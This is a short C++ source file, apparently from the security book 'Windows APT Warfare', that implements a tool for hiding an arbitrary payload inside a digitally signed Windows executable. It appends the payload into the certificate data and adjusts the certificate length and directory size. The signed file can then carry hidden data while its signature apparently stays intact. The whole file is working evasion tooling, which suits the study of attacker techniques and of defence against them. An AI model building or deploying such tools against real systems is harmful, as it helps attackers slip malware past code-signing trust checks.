/**
 * signStego.cpp
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <fstream>
#include <windows.h>
#include <WinTrust.h>
#pragma warning(disable : 4996)
BYTE* MapFileToMemory(LPCSTR filename, LONGLONG& filelen)
{
	FILE* fileptr;
	BYTE* buffer;

	fileptr = fopen(filename, "rb"); // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);	 // Jump to the end of the file
	filelen = ftell(fileptr);		 // Get the current byte offset in the file
	rewind(fileptr);				 // Jump back to the beginning of the file

	buffer = (BYTE*)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr);					   // Read in the entire file
	fclose(fileptr);									   // Close the file
	return buffer;
}

int main(int argc, char** argv) {
	if (argc != 4) {
		auto fileName = strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0];
		printf("usage: %s [path/to/signed_pe] [file/to/append] [path/to/output]\n", fileName);
		return 0;
	}

	// read signed pe file & payload
	LONGLONG signedPeDataLen = 0, payloadSize = 0;
	BYTE *signedPeData = MapFileToMemory(argv[1], signedPeDataLen), // 將數位簽名程式檔案內容晚整讀至變數 signedPeDataLen
		 *payloadData  = MapFileToMemory(argv[2], payloadSize);	// 將欲藏匿的資料檔案內容完整讀至變數 payloadData 中

	// 申請一塊足夠大的空間 outputPeData 欲於儲存暫存即將輸出的 PE 程式檔案內容
	BYTE* outputPeData = new BYTE[signedPeDataLen + payloadSize];
	memcpy(outputPeData, signedPeData, signedPeDataLen);
	auto ntHdr = PIMAGE_NT_HEADERS(&outputPeData[PIMAGE_DOS_HEADER(outputPeData)->e_lfanew]);
	auto certInfo = &ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	
	// append payload into certificate
	auto certData = LPWIN_CERTIFICATE(&outputPeData[certInfo->VirtualAddress]);
	memcpy(&PCHAR(certData)[certData->dwLength], payloadData, payloadSize);
	certInfo->Size = (certData->dwLength += payloadSize);

	// flush pe data back to file
	fwrite(outputPeData, 1, signedPeDataLen + payloadSize, fopen(argv[3], "wb"));
	puts("done.");
}
